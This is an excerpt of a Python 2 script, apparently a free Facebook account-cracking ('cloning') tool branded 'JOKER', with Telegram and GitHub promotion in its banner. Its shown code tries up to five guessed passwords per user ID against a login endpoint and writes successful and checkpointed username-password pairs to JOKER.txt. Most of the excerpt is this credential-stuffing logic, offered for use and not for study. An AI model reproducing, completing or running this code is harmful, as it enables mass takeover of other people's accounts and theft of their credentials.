# MY TELEGRAM CHANNEL @JOKER
# MY TELEGRAM GROUP @ Tar Max Komand 
#MY GITHUB HTTPS://GITHUB.COM/JOKER
#THIS SCRIPT FREE 
...
JOKER_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])

youtuber = JOKER_youtube
...
#JOKERLogo
logo ="""
\033[1;91m           ┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   J \033[1;0m
\033[1;91m        ┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   O \033[1;0m
\033[1;97m        ┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   O \033[1;0m
\033[1;97m        ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   K \033[1;0m
\033[1;91m        ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈   E\033[1;0m
\033[1;91m        ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈   R\033[1;0m
\033[1;97m               ─────────────•◈•──────────\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : JOKER
\033[1;91m GitHub      : https://github.com/MRJOKER2023
\033[1;91m YouTube     : JOKER
\033[1;91m Telegram CH   : https://www.facebook.com/asadullah.shirzad.56
\033[1;91m TLEGRAM GP    : MR JOKER
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[JOKER_OK] ' + k + c + user + ' | ' + pass1
                okb = open('JOKER.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[JOKER_CP] ' + k + c + user + ' | ' + pass1
                cps = open('JOKER.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[JOKER_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('JOKER.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[JOKER_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('JOKER.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[JOKER_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('JOKER.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[JOKER_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('JOKER.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[JOKER_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('JOKER.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[JOKER_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('JOKER.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[JOKER_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('JOKER.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[JOKER_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('JOKER.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : JOKER.txt'
